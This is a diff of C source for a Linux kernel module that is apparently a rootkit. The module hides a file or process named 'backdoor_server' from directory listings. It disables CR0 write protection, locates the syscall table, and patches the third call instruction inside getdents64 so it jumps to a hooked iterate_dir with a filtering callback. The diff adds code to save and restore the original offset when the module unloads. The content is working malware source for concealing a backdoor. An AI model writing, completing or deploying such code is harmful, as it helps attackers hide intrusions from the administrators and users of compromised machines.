@@ -1,6 +1,4 @@
-/*
-  进程隐藏程序
-*/
+
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <asm/unistd.h>
@@ -14,7 +12,7 @@
 #include <asm/uaccess.h>
 #include <linux/unistd.h>
 #include <linux/slab.h> //kmalloc
-#include <linux/security.h>
+#include <linux/security.h>//security_file_permission(file, MAY_READ);
 
 #define CALLOFF 1000
 
@@ -24,10 +22,10 @@
     http://www.xzbu.com/8/view-7178072.htm
 */
 int orig_cr0;
-char fname[20]="backdoor_server";//需要隐藏的进程名
+char fname[20]="backdoor_server";//需要隐藏的文件名
 char *filename=fname;
 const char path[10]="Desktop";
-static unsigned int orig=3239661792;
+static unsigned int orig_offset = 0;// orig iterate_dir offset
 //module_param(processname, charp, 0);
 
 
@@ -203,9 +201,14 @@ int my_iterate_dir(struct file *file, struct dir_context *ctx)
 {
 	
 	//printk("111\n");
-	*(filldir_t *)&ctx->actor = my_filldir64;//修改回调函数
-	struct inode *inode = file_inode(file);
-	int res = -ENOTDIR;
+	struct inode *inode = NULL;
+	int res = 0;
+	/*
+		change callback func
+	*/
+	*(filldir_t *)&ctx->actor = my_filldir64;
+	inode = file_inode(file);
+	res = -ENOTDIR;
 	if (!file->f_op->iterate)
 		goto out;
 
@@ -231,26 +234,26 @@ out:
 EXPORT_SYMBOL(my_iterate_dir);//useful to all kernal
 
 
-
+/*
 asmlinkage long hacked_getdents64(unsigned int fd, struct linux_dirent64 __user * dirent, unsigned int count){
 	
 	struct fd f;
 	struct linux_dirent64 __user * lastdirent;
 	struct getdents_callback64 buf = {
-		.ctx.actor = my_filldir64,
+		.ctx.actor = my_filldir64,   //<-----------callback func
 		.count = count,
 		.current_dir = dirent
 	};
 	int error;
 
-	if (!access_ok(VERIFY_WRITE, dirent, count))//调用access_ok来验证是下用户空间的dirent地址是否越界，是否可写。
+	if (!access_ok(VERIFY_WRITE, dirent, count))//调用access_ok来验证是下用户空间的dirent地址是否越界，是否可写。//<----------first call
 		return -EFAULT;
 
-	f = fdget(fd);
+	f = fdget(fd);				//<----------second call
 	if (!f.file)
 		return -EBADF;
 
-	error = my_iterate_dir(f.file, &buf.ctx);
+	error = my_iterate_dir(f.file, &buf.ctx);	//<----------third call
 	if (error >= 0)
 		error = buf.error;
 	lastdirent = buf.previous;
@@ -264,70 +267,92 @@ asmlinkage long hacked_getdents64(unsigned int fd, struct linux_dirent64 __user 
 	fdput(f);
 	return error;
 }
+*/
 
 
 
-void find_orin_iterate_dir_offset(unsigned int handler, unsigned int new_func)
-{
+/*
+	Setback orig offset
+*/
+unsigned int setback_offset(unsigned int handler, unsigned int offset){
+	unsigned char *p = (unsigned char *)handler;
+	unsigned char *p_orig = NULL;
+	int call_count = 0;
+
+	unsigned char *p_cp = (unsigned char *)kmalloc(CALLOFF,GFP_KERNEL);	
+	memcpy(p_cp,p,CALLOFF);
+
+	p_orig = p_cp;
+	while (1) {
+        	if (*p_cp == 0xe8) //call instuctor(e8):relative addr; ff: absolute addr
+			call_count++;
+		if(call_count==3){
+			p_cp[1] = (offset & 0x000000ff);
+    			p_cp[2] = (offset & 0x0000ff00) >> 8;  
+    			p_cp[3] = (offset & 0x00ff0000) >> 16;
+   			p_cp[4] = (offset & 0xff000000) >> 24;
+			memcpy(p,p_orig,CALLOFF);
+			kfree(p_cp);
+			return 1;
+		}
+		p_cp++;
+    	}
+	
+	return 0;
+}
+
+
+/*
+	get orig func offset and update
+*/
+unsigned int find_orin_iterate_dir_offset(unsigned int handler, unsigned int new_func)
+{	
+	
     	unsigned char *p = (unsigned char *)handler;
     	unsigned char *p_orig = NULL;
     	unsigned int offset = 0;
-    	int i = 0;
 	int call_count = 0;
- 
+ 	int i = 0;
 	unsigned char *p_cp = (unsigned char *)kmalloc(CALLOFF,GFP_KERNEL);
 	memcpy(p_cp,p,CALLOFF);
 	p_orig = p_cp;
-	printk("getdents64: %08x,%08x\n",handler,(unsigned int)p_cp);
-	printk("new_func: %08x\n",new_func);
+
+	printk("getdents64 addr: 0x%08x, new_func addr: 0x%08x\n",handler, new_func);
+
     	while (1) {
-        	if (*p_cp == 0xe8) 
+        	if (*p_cp == 0xe8) //call instuctor(e8):relative addr; ff: absolute path 
 			call_count++;
-		if(call_count==3)
+		if(call_count==3){
+			orig_offset = *((unsigned int*)(p_cp+1)); //recored orig offset
 			break;
+			
+		}
 		p_cp++;
 		i++;
     	}
-	printk("%d, %02x\n",i,*p_cp);
+
+	printk("call code: 0x%02x\n", *p_cp);
+	printk("call addr: 0x%08x, orig_offset: 0x%08x\n", (unsigned int)(p+i), orig_offset);
+
 	//目标地址=下条指令的地址+机器码E8后面所跟的32位数offset
     	offset = new_func - (handler+i) - 5;
-    	printk("*** hook engine: new func offset: 0x%08x\n", offset);
-
+	//write the offset of my_iterate_dir
     	p_cp[1] = (offset & 0x000000ff);
     	p_cp[2] = (offset & 0x0000ff00) >> 8;  
     	p_cp[3] = (offset & 0x00ff0000) >> 16;
    	p_cp[4] = (offset & 0xff000000) >> 24;
 
-    	printk("*** new func addr check: %08x\n",*(unsigned int*)(p_cp+1)+(handler+i) + 5);
+    	printk("call addr: 0x%08x, new func offset: 0x%08x, new func addr check: %08x\n",(unsigned int)(p+i), offset, *((unsigned int*)(p_cp+1))+(handler+i) + 5);
 	memcpy(p,p_orig,CALLOFF);
 	kfree(p_cp);
-	
-
-	unsigned char *p1 = (unsigned char *)handler;
-	unsigned char *p_cp1 = (unsigned char *)kmalloc(CALLOFF,GFP_KERNEL);
-	memcpy(p_cp1,p1,CALLOFF);
-	printk("%02x,%08x\n",*(p_cp1+109),*((unsigned int*)(p_cp1+110)));
-
-	i=0;
-	while(1){
-		if(i>CALLOFF)
-			break;
-		if(*p_cp1 == 0xc1 && *(p_cp1+1) ==0x19 && *(p_cp1+2) == 0x4d&&*(p_cp1+3) == 0xf0){
-			printk("1111\n");
-			break;
-		}
-		p_cp1++;
-		i++;
-	}
-	kfree(p_cp1);
-    	//return orig;
+	return orig_offset;
 }
 
 
 
 static int filter_init(void)
 {
-	printk(KERN_INFO "hideps: module loaded.\n");
+
     	sys_call_table = get_sct_addr();
     	if (!sys_call_table)
    	{
@@ -337,9 +362,15 @@ static int filter_init(void)
     	else
         	printk("sct: 0x%x\n", (unsigned int)sys_call_table);
     	orig_cr0 = clear_and_return_cr0();//取消写保护位，并且返回原来的cr0
-	find_orin_iterate_dir_offset((unsigned int)sys_call_table[__NR_getdents64] ,(unsigned int)my_iterate_dir);
-    	setback_cr0(orig_cr0);
 	
+	//get orig func offset and update
+	find_orin_iterate_dir_offset((unsigned int)sys_call_table[__NR_getdents64] ,(unsigned int)my_iterate_dir);
+
+	//print and check sct
+	printk("sys_getdents addr: %08x\n",(unsigned int)sys_call_table[220]);
+
+    	setback_cr0(orig_cr0);
+	printk(KERN_INFO "******module loaded******\n");
         return 0;
 }
 
@@ -350,12 +381,18 @@ static int filter_init(void)
 static void filter_exit(void)
 {
 	//unsigned int temp = 0;
-    orig_cr0 = clear_and_return_cr0();
-    find_orin_iterate_dir_offset((unsigned int)sys_call_table[__NR_getdents64],(unsigned int)orig);
-	printk("%08x\n",orig);
+   	orig_cr0 = clear_and_return_cr0();
+		
+	//Setback orig offset
+	if( setback_offset((unsigned int)sys_call_table[__NR_getdents64], orig_offset) != 0)	
+		printk("Setback orig offset successed!\n");
+	else 
+		printk("Setback orig offset failed!\n");
 
-    setback_cr0(orig_cr0);
-    printk(KERN_INFO "hideps: module removed\n");
+
+    	setback_cr0(orig_cr0);
+
+    	printk(KERN_INFO "******module removed******\n");
 }
 module_init(filter_init);
 module_exit(filter_exit);
